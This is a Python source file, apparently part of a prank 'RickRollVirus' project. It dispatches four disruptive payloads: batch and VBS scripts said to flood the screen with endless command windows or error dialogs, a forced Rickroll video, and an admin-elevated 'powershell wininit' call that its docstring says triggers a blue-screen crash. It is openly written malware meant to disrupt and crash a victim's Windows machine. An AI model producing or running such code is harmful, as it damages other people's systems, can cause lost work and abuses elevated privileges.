import os, sys
from Run_as_admin import RunasAdmin

class ProcessManager():

    def __init__(self):
        self.runas = RunasAdmin()
        
        
    def runProcess(self, process):
        """
        Runs one of the 4 process that exist

            :Args:
            process: The process that is going to be run this processes can be:
            -infinite-cmd: Displays Infinite cmds
            -infinite-errors: Displays Infinite errors
            -rickroll: Kinda self evident isn't it?
            -blue-screen: programatically creates a BSOD 
        """
        if (process == '-infinite-cmd'):
            os.system('cd C:/Users/ponce/OneDrive/Documentos/Workspace/Python/RickRollVirus/Computer-side && start Infinitecmd.bat')
        elif (process == '-infinite-errors'):
            os.system('cd C:/Users/ponce/OneDrive/Documentos/Workspace/Python/RickRollVirus/Computer-side && start Infiniteerror.vbs && exit')
        elif (process == '-rickroll'):
            os.system('start https://www.youtube.com/watch?v=dQw4w9WgXcQ && exit')
        elif (process == '-blue-screen'):
            self.runas.runasadmin('powershell wininit')
        else:
            print('ERROR: The typed process does not exist')

